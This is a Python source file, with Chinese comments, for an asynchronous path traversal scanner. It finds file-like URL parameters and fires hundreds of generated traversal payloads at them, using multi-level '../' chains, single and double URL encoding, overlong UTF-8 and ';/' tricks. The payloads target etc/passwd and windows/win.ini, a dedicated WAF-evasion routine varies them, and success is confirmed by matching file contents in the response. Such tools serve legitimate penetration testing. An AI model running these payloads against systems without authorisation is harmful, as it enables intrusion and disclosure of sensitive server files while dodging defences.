import asyncio
import aiohttp
import argparse
import logging
import json
import re
import sys
import os
from urllib.parse import urlparse, parse_qs, urlencode, unquote
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
from rich.console import Console  
from rich.progress import Progress, SpinnerColumn, TimeElapsedColumn  
from rich.logging import RichHandler  
from rich.panel import Panel  
from rich.table import Table 
import hashlib

console = Console() 

logging.basicConfig(  
    level=logging.INFO,  
    format="%(message)s",  
    handlers=[RichHandler(rich_tracebacks=True)]  
)
logger = logging.getLogger(__name__)

@dataclass
class ScanTarget:
    """扫描目标信息"""
    url: str
    param_name: str
    param_value: str
    param_type: str  # query/path
    original_value: str = None

@dataclass
class ScanResult:
    """扫描结果"""
    url: str
    param_name: str
    payload: str
    status_code: int
    content_length: int
    is_vulnerable: bool
    response_hash: str
    evidence: str = None
    timestamp: str = None

    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()

class PathTraversalScanner:
    def __init__(
        self,
        max_depth: int = 6,
        waf_evasion: bool = True,
        concurrency: int = 20,
        timeout: float = 5.0,
        user_payloads: List[str] = None
    ):
        self.max_depth = max_depth
        self.waf_evasion = waf_evasion
        self.concurrency = concurrency
        self.timeout = timeout
        self.semaphore = asyncio.Semaphore(concurrency)
        self.results = []
        self.user_payloads = user_payloads or []
        self.urls = []

        # 简化的敏感文件列表
        self.target_files = [
            "etc/passwd",     # Unix系统
            "windows/win.ini" # Windows系统
        ]

        # 可疑参数名
        self.suspicious_params = {
            'file', 'path', 'folder', 'dir', 'download', 'upload',
            'document', 'doc', 'img', 'image', 'filename', 'filepath',
            'template', 'style', 'include', 'require', 'source',
            'data', 'page', 'show', 'view'
        }

        # 常见文件扩展名
        self.file_extensions = {
            'php', 'asp', 'aspx', 'jsp', 'html', 'htm', 'txt',
            'pdf', 'doc', 'docx', 'ini', 'log', 'xml', 'conf'
        }

        # 常见目录名
        self.common_dirs = {
            'images', 'img', 'uploads', 'files', 'static', 
            'data', 'docs', 'templates', 'includes', 'admin',
            'backup', 'config', 'src', 'temp'
        }

        # 添加统计信息  
        self.stats = {  
            'total_urls': 0,  
            'total_targets': 0,  
            'tested_payloads': 0,  
            'vulnerabilities': 0,  
            'start_time': None,  
        } 

    def has_file_pattern(self, value: str) -> bool:  
        """  
        检查是否包含文件/路径模式  
        """  
        # URL解码  
        decoded = unquote(value)  
        
        # 检查路径分隔符  
        has_path_separator = any(sep in decoded for sep in ['/', '\\'])  
        
        # 检查文件扩展名  
        has_extension = False  
        if '.' in decoded:  
            ext = decoded.rsplit('.', 1)[-1].lower()  
            if ext in self.file_extensions:  
                has_extension = True  
        
        # 检查特殊模式  
        special_patterns = [  
            r'\.\.',           # 目录遍历  
            r'%2e',           # 编码的点号  
            r'file:/',        # 文件协议  
            r'php://',        # PHP伪协议  
        ]  
        has_special_pattern = any(re.search(pattern, decoded, re.IGNORECASE)   
                                for pattern in special_patterns)  
        
        return has_path_separator or has_extension or has_special_pattern

    def is_suspicious_param(self, param: str) -> bool:
        """检查是否为可疑参数名"""
        param = param.lower()
        return (any(p in param for p in self.suspicious_params) or
                any(ext in param for ext in self.file_extensions))

    def identify_targets(self, url: str) -> List[ScanTarget]:  
        """识别目标参数"""  
        targets = []  
        parsed = urlparse(url)  
        
        # 检查查询参数  
        query_params = parse_qs(parsed.query)  
        for param, values in query_params.items():  
            if not values:  
                continue  
                
            value = values[0]  
            # 检查参数名是否可疑或参数值是否包含路径模式  
            if (self.is_suspicious_param(param) or   
                '/' in value or   
                '\\' in value or   
                self.has_file_pattern(value)):  
                targets.append(ScanTarget(  
                    url=url,  
                    param_name=param,  
                    param_value=value,  
                    param_type='query',  
                    original_value=value  
                ))  
        
        return targets

    def generate_traversal_patterns(self) -> List[str]:
        """生成基础路径穿越模式"""
        patterns = []
        separators = ['/', '\\']
        dot_variants = ['..', '...']
        
        for depth in range(1, self.max_depth + 1):
            for dot in dot_variants:
                for sep in separators:
                    # 基本模式
                    pattern = f"{dot}{sep}" * depth
                    patterns.append(pattern)
                    
                    # URL编码变体
                    patterns.append(pattern.replace('/', '%2f'))
                    patterns.append(pattern.replace('\\', '%5c'))
                    
                    # 双编码变体
                    patterns.append(pattern.replace('/', '%252f'))
                    patterns.append(pattern.replace('\\', '%255c'))
                    
                    # 特殊变体
                    patterns.append(pattern.replace('/', ';/'))
                    patterns.append(pattern.replace('/', '/.;/'))
                    
        return list(set(patterns))  # 去重
    
    
    def apply_waf_evasion(self, payload: str) -> List[str]:
        """应用WAF规避技术"""
        variations = [payload]
        
        if not self.waf_evasion:
            return variations
            
        # 基础编码变换
        encodings = {
            '../': ['..%2f', '..%252f', '%2e%2e%2f'],
            '..\\': ['..%5c', '..%255c', '%2e%2e%5c'],
            '/': ['%2f', '%252f'],
            '\\': ['%5c', '%255c']
        }

        # WAF规避技巧
        evasion_techniques = [
            # 大小写变换
            lambda p: p.replace('%2f', '%2F').replace('%5c', '%5C'),
            # 非标准路径
            lambda p: p.replace('/', '/.'),
            # 混合编码
            lambda p: p.replace('../', '..%c0%af'),
            # 特殊字符
            lambda p: p.replace('/', ';/'),
        ]

        # 生成变种
        for technique in evasion_techniques:
            try:
                variant = technique(payload)
                if variant != payload and variant not in variations:
                    variations.append(variant)
            except Exception:
                continue

        return variations

    def generate_payloads(self) -> List[str]:
        """生成完整的payload列表"""
        payloads = set()
        traversal_patterns = self.generate_traversal_patterns()
        
        # 为每个目标文件生成payload
        for pattern in traversal_patterns:
            for target in self.target_files:
                base_payload = pattern + target
                # 应用WAF规避变换
                variations = self.apply_waf_evasion(base_payload)
                payloads.update(variations)
        
        # 添加一些特殊payload
        special_payloads = [
            '....//....//etc/passwd',
            '.././.././etc/passwd',
            '/%5c../%5c../etc/passwd',
            '..%00/',
            '../' * 8
        ]
        
        if self.waf_evasion:
            for payload in special_payloads:
                variations = self.apply_waf_evasion(payload)
                payloads.update(variations)
        else:
            payloads.update(special_payloads)
        
        # 添加用户自定义payload
        if self.user_payloads:
            payloads.update(self.user_payloads)
        
        return list(payloads)

    def generate_test_url(self, target: ScanTarget, payload: str) -> str:
        """生成测试URL"""
        parsed = urlparse(target.url)
        
        if target.param_type == 'query':
            # 修改查询参数
            query_dict = parse_qs(parsed.query)
            query_dict[target.param_name] = [payload]
            new_query = urlencode(query_dict, doseq=True)
            
            return parsed._replace(query=new_query).geturl()
        else:
            # 修改路径参数
            path_segments = parsed.path.split('/')
            path_segments[int(target.param_name.split('_')[1])] = payload
            new_path = '/'.join(path_segments)
            
            return parsed._replace(path=new_path).geturl()

    def is_vulnerable_response(self, content: str, status_code: int) -> Tuple[bool, str]:
        """检查响应是否表明存在漏洞"""
        # 成功的状态码
        if status_code not in [200, 201, 202, 203, 206]:
            return False, None
            
        # Unix passwd文件特征
        unix_patterns = [
            r'root:.*:0:0:',
            r'bin:.*:/bin/',
            r'nobody:.*:99:99:',
            r'daemon:.*:/usr/sbin',
        ]
        
        # Windows配置文件特征
        win_patterns = [
            r'\[windows\]',
            r'for 16-bit app support',
            r'\[fonts\]',
            r'\[extensions\]'
        ]
        
        # 检查特征
        for pattern in unix_patterns + win_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True, f"Found pattern: {pattern}"
        
        return False, None

    async def test_target(self, session: aiohttp.ClientSession, target: ScanTarget, progress, payloads: List[str]) -> List[ScanResult]:  
        """测试单个目标"""  
        results = []  
        
        payload_task = progress.add_task(  
            "[magenta]Testing payloads...",  
            total=len(payloads)  
        )  
        
        async with self.semaphore:  
            for payload in payloads:  
                try:  
                    test_url = self.generate_test_url(target, payload)  
                    self.stats['tested_payloads'] += 1  
                    
                    async with session.get(  
                        test_url,  
                        headers=self.get_headers(),  
                        timeout=self.timeout,  
                        ssl=False,  
                        allow_redirects=False  
                    ) as response:  
                        content = await response.text()  
                        
                        is_vulnerable, evidence = self.is_vulnerable_response(  
                            content,   
                            response.status  
                        )  
                        
                        if is_vulnerable:  
                            result = ScanResult(  
                                url=test_url,  
                                param_name=target.param_name,  
                                payload=payload,  
                                status_code=response.status,  
                                content_length=len(content),  
                                is_vulnerable=True,  
                                response_hash=hashlib.md5(content.encode()).hexdigest(),  
                                evidence=evidence  
                            )  
                            results.append(result)  
                
                except Exception as e:  
                    progress.console.print(f"[red]Error testing {payload}:[/] {str(e)}")  
                
                finally:  
                    progress.update(payload_task, advance=1)  
        
        return results

    async def scan(self, urls: List[str]) -> List[ScanResult]:  
        """执行扫描"""  
        self.urls = urls
        self.stats['start_time'] = datetime.now()  
        self.stats['total_urls'] = len(urls)  
        all_results = []  

        # 预先生成所有payload并显示数量  
        payloads = self.generate_payloads()  
        payload_count = len(payloads)  

        # 打印扫描开始信息  
        console.print(Panel.fit(  
            "[bold green]Path Traversal Vulnerability Scanner[/]\n"  
            f"Starting scan at: {self.stats['start_time'].strftime('%Y-%m-%d %H:%M:%S')}\n"  
            f"Target URLs: {len(urls)}\n"  
            f"Max Depth: {self.max_depth}\n"  
            f"WAF Evasion: {'Enabled' if self.waf_evasion else 'Disabled'}\n"  
            f"Concurrency: {self.concurrency}\n"  
            f"Total Payloads: {payload_count}",  
            title="Scan Information"  
        ))

        with Progress(  
            SpinnerColumn(),  
            *Progress.get_default_columns(),  
            TimeElapsedColumn(),  
            console=console,  
            transient=False  
        ) as progress:  
            url_task = progress.add_task("[yellow]Processing URLs...", total=len(urls))  
            
            async with aiohttp.ClientSession() as session:  
                for url in urls:  
                    try:  
                        progress.console.print(f"\n[cyan]Scanning URL:[/] {url}")  
                        
                        # 识别目标参数  
                        targets = self.identify_targets(url)  
                        self.stats['total_targets'] += len(targets)  
                        
                        if not targets:  
                            progress.console.print("[yellow]No suitable targets found[/]")  
                            continue  
                            
                        progress.console.print(f"[green]Found {len(targets)} potential targets[/]")  
                        
                        # 测试每个目标  
                        target_task = progress.add_task(  
                            "[cyan]Testing parameters...",  
                            total=len(targets)  
                        )  
                        
                        for target in targets:  
                            progress.console.print(f"[blue]Testing parameter:[/] {target.param_name}")  
                            results = await self.test_target(session, target, progress, payloads)  
                            all_results.extend(results)  
                            progress.update(target_task, advance=1)  
                            
                            if results:  
                                self.stats['vulnerabilities'] += len(results)  
                                # 显示发现的漏洞  
                                for result in results:  
                                    self._print_vulnerability(result)  
                        
                        progress.update(url_task, advance=1)  
                        
                    except Exception as e:  
                        progress.console.print(f"[red]Error scanning {url}:[/] {str(e)}")  
                        continue  

        # 打印扫描统计  
        self._print_scan_summary()  
        
        self.results = all_results  
        return all_results

    def _print_vulnerability(self, result: ScanResult):  
        """打印漏洞信息"""  
        vuln_table = Table(show_header=False, box=None)  
        vuln_table.add_row("[red]Vulnerability Found![/]")  
        vuln_table.add_row(f"URL: {result.url}")  
        vuln_table.add_row(f"Parameter: {result.param_name}")  
        vuln_table.add_row(f"Payload: {result.payload}")  
        vuln_table.add_row(f"Status Code: {result.status_code}")  
        vuln_table.add_row(f"Evidence: {result.evidence}")  
        console.print(Panel(vuln_table, title="[red]Vulnerability Details[/]"))  

    def _print_scan_summary(self):  
        """打印扫描统计信息"""  
        duration = datetime.now() - self.stats['start_time']  
        
        summary_table = Table(title="Scan Summary")  
        summary_table.add_column("Metric", style="cyan")  
        summary_table.add_column("Value", style="green")  
        
        summary_table.add_row("Total URLs", str(self.stats['total_urls']))  
        summary_table.add_row("Total Targets", str(self.stats['total_targets']))  
        summary_table.add_row("Tested Payloads", str(self.stats['tested_payloads']))  
        summary_table.add_row("Vulnerabilities Found", str(self.stats['vulnerabilities']))  
        summary_table.add_row("Duration", str(duration).split('.')[0])  
        
        console.print(summary_table)  

    def get_headers(self) -> Dict[str, str]:  
        """获取请求头"""  
        return {  
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',  
            'Accept': '*/*',  
            'Accept-Encoding': 'gzip, deflate',  
            'Accept-Language': 'en-US,en;q=0.9',  
            'Connection': 'close'  
        }
    
    def save_report(self, filename: str):  
        """保存扫描报告"""  
        # 创建results目录  
        results_dir = "results"  
        if not os.path.exists(results_dir):  
            os.makedirs(results_dir)  
        
        # 生成带时间戳的文件名  
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")  
        if filename == 'scan_report.json':  # 如果使用默认文件名，则加上时间戳  
            filename = f"scan_report_{timestamp}.json"  
        
        # 完整的文件路径  
        file_path = os.path.join(results_dir, filename)  
        
        # 计算扫描时间  
        duration = datetime.now() - self.stats['start_time']  
        
        # 从命令行参数重建实际执行的命令  
        args = sys.argv[1:]  # 排除脚本名称  
        scan_command = f"python {sys.argv[0]} {' '.join(args)}"  
        
        report = {  
            'scan_info': {  
                'timestamp': timestamp,  
                'command': scan_command,  
                'target_urls': self.urls,  
                'start_time': self.stats['start_time'].isoformat(),  
                'end_time': datetime.now().isoformat(),  
                'duration': str(duration).split('.')[0],  # 移除微秒部分  
                'max_depth': self.max_depth,  
                'waf_evasion': self.waf_evasion,  
                'concurrency': self.concurrency,  
                'timeout': self.timeout  
            },  
            'stats': {  
                'total_urls': self.stats['total_urls'],  
                'total_targets': self.stats['total_targets'],  
                'tested_payloads': self.stats['tested_payloads'],  
                'vulnerabilities_found': self.stats['vulnerabilities']  
            },  
            'results': [  
                {  
                    'url': r.url,  
                    'param_name': r.param_name,  
                    'payload': r.payload,  
                    'status_code': r.status_code,  
                    'content_length': r.content_length,  
                    'evidence': r.evidence,  
                    'timestamp': r.timestamp  
                }  
                for r in self.results  
            ] if self.results else []  
        }  
        
        try:  
            with open(file_path, 'w', encoding='utf-8') as f:  
                json.dump(report, f, indent=2, ensure_ascii=False)  
            console.print(f"\n[green]Report saved to:[/] {file_path}")  
        except Exception as e:  
            console.print(f"\n[red]Error saving report:[/] {str(e)}")

def main():
    """命令行入口"""
    parser = argparse.ArgumentParser(description="Path Traversal Vulnerability Scanner")
    parser.add_argument('-u', '--urls', required=True, nargs='+', help='Target URLs')
    parser.add_argument('-d', '--depth', type=int, default=4, help='Maximum traversal depth')
    parser.add_argument('--waf', action='store_true', help='Enable WAF evasion techniques')
    parser.add_argument('-c', '--concurrency', type=int, default=20, help='Max concurrent requests')
    parser.add_argument('-t', '--timeout', type=float, default=5.0, help='Request timeout')
    parser.add_argument('-o', '--output', default='scan_report.json', help='Output report file')
    
    args = parser.parse_args()
    
    scanner = PathTraversalScanner(
        max_depth=args.depth,
        waf_evasion=args.waf,
        concurrency=args.concurrency,
        timeout=args.timeout
    )
    
    asyncio.run(scanner.scan(args.urls))
    scanner.save_report(args.output)

if __name__ == '__main__':
    main()